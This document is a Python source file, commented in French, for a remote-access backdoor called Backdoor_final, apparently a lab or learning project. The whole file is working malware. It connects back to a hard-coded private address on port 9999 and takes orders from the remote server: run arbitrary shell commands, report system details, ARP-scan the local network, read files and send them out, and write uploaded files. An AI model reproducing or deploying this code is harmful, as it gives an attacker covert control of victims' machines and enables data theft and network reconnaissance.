# ce code on exécuté dans la machine de client.
import socket
import subprocess
import platform
import os
import scapy.all as scapy
import json





class Backdoor_final:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        self.connection.connect((ip, port))



    def execute_systeme_command(self,command):
        if command[0] == "cd" and len(command) > 1:
            return self.cd(command[1])
        com = ""
        for i in range(len(command)):
            com = com +command[i] + " "
        command = com
        return subprocess.check_output(command,shell=True)
       

    def discover_ip_mac(self,ip):
           arp_request = scapy.ARP(pdst=ip)
           broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
           arp_request_broadcast = broadcast/arp_request
           response = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
           discover = "_________________________________________________________\n"
           discover = discover + "IP\t\t\tMAC Address\n"
           discover = discover + "---------------------------------------------------------\n"
           for element in response:
                discover = discover + element[1].psrc + "\t\t" + element[1].hwsrc + "\n"
           return discover

    def send_to_server(self,message):
        message_json = json.dumps(message)
        self.connection.send(bytes(message_json,"utf-8")) 
       
    def receive_from_server(self):
        message = ""
        while True:
            try:
                message = message + self.connection.recv(1024).decode("utf-8")
                return json.loads(message)   
            except ValueError:
                continue   
    
    def cd(self,path):
        try:
            os.chdir(path)
            return "[+] changing working directory to " + path +"\n"
        except:
            return "[-] error verifier the path." + "\n"  

    def read_file(self,path):
        with open(path,"r") as file:
            return file.read()  
    
    def write_file(self,dstpath,content):
        if content != "error":
            with open(dstpath,"w") as file:
                file.write(content)
                return "[+] upload successful."
        return "error execution."  

    
    def run(self):
        while True:
            choix = self.receive_from_server()
            if choix == "1":
                try:
                    system = platform.uname()
                    information = f"System: {system.system}\n"
                    information = information + f"Node Name: {system.node}\n"
                    information = information + f"Release: {system.release}\n"
                    information = information + f"Version: {system.version}\n"
                    information = information + f"Machine: {system.machine}\n"
                    information = information + f"Processor: {system.processor}\n"
                    self.send_to_server(information)
                except:
                    self.send_to_server("error execution.")
            elif choix == "2":
                while True:
                    try:
                        command = self.receive_from_server()
                        if command[0].lower() != "exit":
                            output = self.execute_systeme_command(command)
                            try:
                                self.send_to_server(output.decode("utf-8"))
                            except AttributeError:
                                self.send_to_server(output)

                        else:
                            break
                    except:
                        self.send_to_server("error execution.")
                    
                    #self.send_to_server(output)
            elif choix == "3":
                try:
                    ip = self.receive_from_server()
                    output = self.discover_ip_mac(ip)
                    self.send_to_server(output)
                except:
                    self.send_to_server("error execution.")
            elif choix == "4":
                try:
                    path = self.receive_from_server()
                    content_of_file = self.read_file(path)
                    self.send_to_server(content_of_file)
                except:
                    self.send_to_server("error")
                
            elif choix == "5":
                    dst_path = self.receive_from_server()
                    content_of_file = self.receive_from_server()
                    if content_of_file != "error":
                        output = self.write_file(dst_path,content_of_file)
                        self.send_to_server(output)
                    else:
                        self.send_to_server("error excution")
            elif choix == "6":
                self.connection.close()
                exit()
                                
    
        
            

backdoor = Backdoor_final("192.168.174.128",9999)
backdoor.run()
        
